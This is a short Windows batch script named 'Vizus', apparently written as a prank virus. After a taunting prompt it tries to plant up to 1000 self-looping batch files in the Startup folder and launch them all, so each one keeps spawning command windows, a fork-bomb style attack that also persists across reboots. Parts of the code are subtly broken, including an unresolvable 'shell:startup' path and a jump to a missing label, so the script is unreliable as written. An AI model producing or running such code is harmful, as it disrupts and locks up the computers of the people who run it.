@echo off
title Vizus
echo Hello %username%, if you have click on this...
echo Any last word?
set /p lw=">> "
if %lw% equ draw (
echo Enjoy, %username%
START "" mspaint
timeout 60 /nobreak > nul
exit mspaint
echo Okay, now, its time for me :>
timeout 3 /nobreak > nul
goto vir
) else (
goto vir
)

:vir
set /a i=0
md shell:startup\vir
:ent
(
echo :loop
echo start cmd
echo ping 127.0.0.1 -n 1 -w 500 > nul
echo goto loop
)>shell:startup\vir\%i%.bat
set /a i=%i%+1
if %i% neq 1000 goto loop
:start
set /a x=0
cd shell:startup\vir
start %x%.bat
set /a x=%x%+1
if %x% neq 1000 goto start
pause >nul
exit
